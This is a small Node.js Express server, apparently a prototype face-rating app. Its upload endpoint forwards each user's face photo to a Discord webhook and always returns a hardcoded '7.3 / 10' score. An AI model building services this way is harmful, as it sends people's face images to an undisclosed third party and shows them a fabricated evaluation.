import express from "express";
import multer from "multer";
import fs from "fs";
import path from "path";
import fetch from "node-fetch";

const app = express();
const PORT = process.env.PORT || 3000;
const DISCORD_WEBHOOK_URL = process.env.DISCORD_WEBHOOK_URL;

// 업로드 폴더
const uploadDir = "./uploads";
if (!fs.existsSync(uploadDir)) {
  fs.mkdirSync(uploadDir);
}

// multer
const upload = multer({ dest: uploadDir });

// 정적 파일
app.use(express.static("public"));

// 테스트용
app.get("/health", (req, res) => {
  res.send("OK");
});

// 업로드
app.post("/upload", upload.single("photo"), async (req, res) => {
  try {
    if (!req.file) {
      return res.json({ result: "❌ 파일 안 들어옴" });
    }

    const filePath = req.file.path;

    // 디스코드로 사진 + 메시지 전송
    const form = new FormData();
    form.append(
      "file",
      fs.createReadStream(filePath),
      "face.jpg"
    );
    form.append(
      "content",
      "📸 얼굴 사진 도착 (테스트 성공)"
    );

    await fetch(DISCORD_WEBHOOK_URL, {
      method: "POST",
      body: form
    });

    // 결과는 무조건 리턴
    res.json({
      result: "✅ 업로드 성공\n점수: 7.3 / 10\n(현재는 테스트 평가)"
    });

    // 파일 삭제
    fs.unlink(filePath, () => {});
  } catch (err) {
    console.error(err);
    res.json({
      result: "❌ 서버 에러 발생"
    });
  }
});

app.listen(PORT, () => {
  console.log("Server running on", PORT);
});
